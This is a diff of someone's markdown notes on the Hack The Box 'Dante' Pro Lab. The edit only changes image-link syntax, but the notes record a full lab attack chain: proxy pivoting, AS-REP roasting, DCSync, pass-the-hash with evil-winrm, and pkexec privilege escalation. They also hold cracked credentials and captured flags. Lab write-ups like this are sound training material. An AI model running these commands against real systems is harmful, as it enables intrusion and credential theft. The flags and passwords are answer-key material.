@@ -25,7 +25,7 @@ Then:
 ```
 
 Finally, I needed to add the new reverse proxy and the new open port to the etc/proxychains4.conf file. I figured out that the port the needed to be set in proxychains (below) and use for the remote connection above from the victim needed to be an open port. From there, I was then even able to run nmap locally on my kali machine by disabling the first proxy (commenting it out) and running **_proxychains_** before the command.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.53.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.53.png)
 **_Reference: <https://ap3x.github.io/posts/pivoting-with-chisel/>_**
 
 **_SOMETIMES, YOU MAY NEED TO TRY DIFFERENT FORWARDED PORT UNTIL IT WORKS. 389 GAME ME ISSUES AND I HAD TO TRY 3333_**
@@ -40,9 +40,9 @@ However, I will use the following command to automate this from a file with all 
 proxychains impacket-GetNPUsers dante/-no-pass -usersfile /home/cl3al/Desktop/userfile.txt -dc-ip=172.16.2.5
 ```
 
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.52.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.52.png)
 Nmap scan done locally as well:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.54.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.54.png)
 
 After conducting an AS\_REP ROAST attack, I found the following TGT which can now be cracked with john!!:
 ```
@@ -55,7 +55,7 @@ username: dante\jbercov
 password: myspace7
 ```
 
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.55.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.55.png)
 
 Next, I ran bloodhound-python to gather all information for Active Directory and the zip file is stored in my root directory. The command I used once again was.:
 ```
@@ -64,9 +64,9 @@ proxychains bloodhound-python -d dante.admin -v --zip -c All -u jbercov -p myspa
 
 I now need to investigate this in Bloodhound to see what I can find next. In checking, bloodhound, I see that DCsync is available for me to use for jbercov to domain admin as shown below.:
 
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.57.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.57.png)
 In searching for "dcsync" in msfconsole, I came across and used the following module which retrieved hashes.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.56.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.56.png)
 
 Raw Data:
 ```
@@ -100,25 +100,25 @@ proxychains evil-winrm -i 172.16.2.5 -u jbercov -H 2747def689b576780fe2339fd5966
 ```
 
 I downloaded the flag.txt file as shown here.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.58.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.58.png)
 flag:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.59.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.59.png)
 
 ```
 DANTE{Im_too_hot_Im_K3rb3r045TinG!}
 ```
 
 I then quickly found the second flag.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.60.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.60.png)
 
 ```
 DANTE{DC_or_Marvel?}
 ```
 
 I also found a note.txt file which contained the following tip regarding the previous discovery of the internal admin subnet.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.61.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.61.png)
 Lastly, I inspected the Jenkins.bat file in the Documents directory for the Administrator which revealed the following.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.62.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.62.png)
 Raw data:
 ```
 Admin_129834765
@@ -126,13 +126,13 @@ SamsungOctober102030
 ```
 
 **Host 172.16.2.101:**
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.93.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.93.png)
 I missed this before but in running more nmap scans, this system stands out among all other failed hosts. This is nix05 a Linux machine. Here are some more details.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.94.png]]![[./_resources/HTB_Pro_Lab_Dante.resources/image.95.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.94.png)![](./_resources/HTB_Pro_Lab_Dante.resources/image.95.png)
 \*\*\*I need to use katwamba's id\_rsa key to access the .20 DC. Then, change katwamab's password and access the machine via rdp to setup chisel and add the socks port to etc/proxychains4.conf. From there, I can continue investigating .2.101 (this nix05) machine. Comment out 9999 and uncomment 389 socks ports.\*\*\*
 
 It seems that the only port that appears to be open is SSH as shown below.:
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.96.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.96.png)
 
 ```
 PORT  STATE SERVICE VERSION
@@ -155,7 +155,7 @@ cracked hash: manchesterunited
 
 The combined unshadowed file is on the Desktop as: **_results.1.12.txt_** and just needs to be cracked with john which can take some time.
 
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.97.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.97.png)
 
 Vulnerable to CVE-2021-4034
 
@@ -163,7 +163,7 @@ Vulnerable to CVE-2021-3560
 
 Using the first CVE once again to quickly escalate privileges, I obtained the root flag. However, I have yet to find the user flag here. Also, I saved the passwd and shadow file information to my Desktop as **_shadow.2.101.txt_** and **_passwd.2.101.txt_** respectively. I can use the unshadow command to combine both for john to then crack. Check the history for the correct command.
 
-![[./_resources/HTB_Pro_Lab_Dante.resources/image.98.png]]
+![](./_resources/HTB_Pro_Lab_Dante.resources/image.98.png)
 Apparently, I unintendedly escalated privs NOT through the BoF lol. I will wanna redo this so I can learn this one. Check John Hammond's video on it and also check out: <https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef> for resources. Apart from that, this is the only flag on the machine apparently and the sql01 credentials are NOT here which is another conundrum. I will need to figure that out somehow.
 
 I was able to transfer linpeas and use the following commands to perform a network enumeration scan which now allowed me to discover the [172.16.2.6](http://172.16.2.6) machine. :
